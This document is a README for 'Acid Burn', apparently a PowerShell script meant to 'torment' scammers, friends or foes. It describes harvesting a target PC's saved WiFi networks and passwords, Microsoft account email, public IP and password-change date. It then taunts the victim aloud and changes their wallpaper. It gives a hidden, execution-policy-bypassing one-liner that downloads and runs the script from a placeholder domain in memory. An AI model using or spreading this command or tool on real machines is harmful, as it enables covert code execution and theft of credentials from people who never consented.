# Acid Burn

A script I put together to torment Call Center Scammers but can be used on your friends as well...or foes.

## Description

This program enumerates a target PC to include Operating System, RAM Capacity, Public IP, and Email associated with the Microsoft account.
The SSID and WiFi password of any current or previously connected to networks.
It determines the last day they changed their password and how many days ago.
Once the information is gathered, the script will pause until a mouse movement is detected.
Then, the script uses Sapi speak to roast their set up and lack of security.
If wifi networks and passwords are detected, the wallpaper will be changed to an image displaying that information.
The generated image will be saved to the desktop and steganography is used to put a hidden message at the bottom of the binary output of the generated image.

## Getting Started

### Dependencies

* Windows 10,11

### Executing program

```
powershell -w h -NoP -NonI -Exec Bypass irm MYDOMAIN.HERE/zyg | iex
```

* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
* Enumerate and get Full Name, Amount of RAM, Public IP, Wifi Password Length, Wifi Networks and Passwords, Day Password was last changed, Email
* Custom responses have been programmed to roast the target based on the information gathered during enumeration phase 
* Wifi Networks and passwords will be generated into an image that will be saved on the desktop
* Image opened in notepad will reveal a hidden message at the bottom of the binary output
* Script will freeze until a mouse movement is detected 
* Sapi Speak will be used to speak out loud the custom responses 
* Desktop wallpaper will be changed to the image of the targets Wifi Networks and Passwords
* Text file will be left on the target desktop with whatever message you choose

##
